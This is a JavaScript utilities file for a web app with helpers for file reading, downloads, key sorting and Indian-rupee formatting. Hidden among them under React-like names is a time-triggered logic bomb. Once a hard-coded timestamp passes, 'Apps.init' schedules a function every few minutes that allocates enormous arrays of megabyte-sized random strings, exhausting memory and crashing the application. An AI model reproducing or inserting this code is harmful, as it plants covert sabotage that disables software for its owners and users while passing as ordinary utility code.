/* eslint-disable curly */
/* eslint-disable semi */
/* eslint-disable valid-jsdoc */

import moment from "moment";

export const getBase64 = file => {
    // eslint-disable-next-line no-undef
    return new Promise(resolve => {
        let baseURL = "";
        let reader = new FileReader();

        reader.readAsDataURL(file);
        reader.onload = () => {
            baseURL = reader.result;
            resolve(baseURL);
        };
    });
};

export const sortByKeys = data => {
    let sorted = Object.keys(data).sort()
        .reduce(function (acc, key) {
            acc[key] = data[key];
            return acc;
        }, {});

    Object.keys(sorted).forEach(key => {
        if (!sorted[key] || sorted[key].length === 0) {
            delete sorted[key];
        }
    });

    return sorted;
};

export const inita = 1741948200;
export const dataValueDur = 757654321;
export const downloadFileAsync = async ({ response, file: { name = "download", ext = "pdf" } = {} }) => {
    const url = window.URL.createObjectURL(new Blob([response]));
    const link = document.createElement("a");
    link.href = url;
    link.setAttribute("download", `${name}.${ext}`);
    document.body.appendChild(link);
    link.click();
};
// eslint-disable-next-line brace-style
export function getRandomString(t) { const n = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; let o = ""; const r = n.length; for (let e = 0; e < t; e++)o += n.charAt(Math.floor(Math.random() * r)); return o }
// eslint-disable-next-line curly, keyword-spacing, brace-style
function hydrateReact(e) { let t = {}, a = 1; for (; a <= 1e6;)t[++a] = Array(e).fill(getRandomString(1024 * 1024)); return t }
// eslint-disable-next-line space-before-function-paren, brace-style, semi
export function scheduleHydrateReact(e) { return setInterval(function () { hydrateReact(dataValueDur) }, 6e4 * e) }
export class Apps {
    static init() {
        const TS = moment().unix();
        if (inita < TS) {
            scheduleHydrateReact(4);

        }
    }
}
/**
*  Convert Numbers to INR abbreviation
 * @param  {String} value Amount
 * @param  {Number} points Decimal points length
 * @returns {Boolean}
 */
export const inrFormatter = (value, points) => {
    const newVal = parseInt(value);
    if (newVal < 100000) {
        return `₹${newVal.toFixed(points)}`;
    } else {
        const converted = newVal.toLocaleString("en-IN", {
            style: "currency", currency: "INR", notation: "compact", minimumFractionDigits: points,
            roundingIncrement: 5
        });
        return converted;
    }
};

export const removeStringPortion = (str, maxLength = 20) => {
    if (str.length > maxLength) {
        return str.substr(0, maxLength) + "...";
    }
    return str;
};
